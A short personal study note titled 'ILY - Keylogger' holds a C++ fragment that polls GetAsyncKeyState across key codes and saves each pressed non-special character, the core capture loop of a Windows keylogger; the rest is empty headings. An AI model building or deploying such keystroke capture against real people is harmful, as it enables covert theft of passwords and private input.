**Title:** ILY - Keylogger
**Tags:** [[ILY - Easy]]
**Topics:**

---
# ILY - Keylogger
# General
## startLogging()

```c++
for (char key = 8; key<=173; key++) {
	if (GetAsyncKeyState(key) == 0xFFFF8001) {
	    if (not specialKey(key)) {
            string str(1, key);
            save(str);
        }
    }
}
```

# First Iteration
